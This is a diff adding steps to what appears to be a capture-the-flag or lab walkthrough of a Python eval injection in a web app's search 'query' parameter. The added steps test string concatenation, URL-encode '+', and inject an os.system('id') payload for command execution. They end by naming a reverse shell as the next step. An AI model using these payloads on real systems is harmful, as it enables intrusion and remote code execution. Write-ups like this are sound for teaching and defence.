@@ -247,3 +247,19 @@ print('input')
 ```
 engine=Google&query=islam')+%23+
 ```
+- so we can assume we are on eval statment
+- we can put + and string to test for string concatination
+- it would be like this
+```
+engine=Google&query=islam')+'kare'+%23+
+```
+- no response ,since + is special charchter we url encode
+```
+engine=Google&query=islam')%2b'kare'+%23+
+```
+- and we got the string concatenated
+- now we go to runnig the real commands like id for clarity
+```
+engine=Google&query=islam')%2b__import__('os').system('id')+%23+
+```
+- and we get the id now we go to reverse shell
